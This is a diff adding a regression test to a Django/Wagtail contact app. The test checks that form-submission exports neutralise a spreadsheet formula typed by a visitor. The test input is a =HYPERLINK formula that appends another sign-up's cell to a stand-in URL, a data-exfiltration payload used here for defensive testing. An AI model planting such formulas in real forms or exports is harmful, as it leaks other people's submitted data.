@@ -1,7 +1,10 @@
+import io
+
 import pytest
 from bs4 import BeautifulSoup
 from django.core import mail
 from django.urls import reverse
+from openpyxl import load_workbook
 from wagtail.contrib.forms.models import FormSubmission
 
 from contact.models import FormField, FormPage
@@ -132,3 +135,21 @@ class TestSubmissionsInTheAdmin:
 
         assert response["Content-Type"].startswith("text/csv")
         assert "sam@example.com" in b"".join(response.streaming_content).decode()
+
+    # Regression: ISSUE-003 — a sign-up "named" =HYPERLINK(…) was exported as a live formula,
+    # which could send the other sign-ups away when opened. Found by /qa on 2026-10-12.
+    @pytest.mark.parametrize("export", ["csv", "xlsx"])
+    def test_export_shows_a_formula_typed_by_a_visitor_as_text(
+        self, admin_client, client, volunteer_form, export
+    ):
+        formula = '=HYPERLINK("https://example.org/?d="&C2,"Open")'
+        client.post(volunteer_form.url, {**VALID_DATA, "your_name": formula})
+
+        url = reverse("wagtailforms:list_submissions", args=[volunteer_form.pk])
+        content = b"".join(admin_client.get(url, {"export": export}).streaming_content)
+
+        if export == "csv":
+            assert f"'{formula}".replace('"', '""') in content.decode()
+        else:
+            cells = [cell for row in load_workbook(io.BytesIO(content)).active for cell in row]
+            assert [cell.data_type for cell in cells if cell.value == formula] == ["s"]
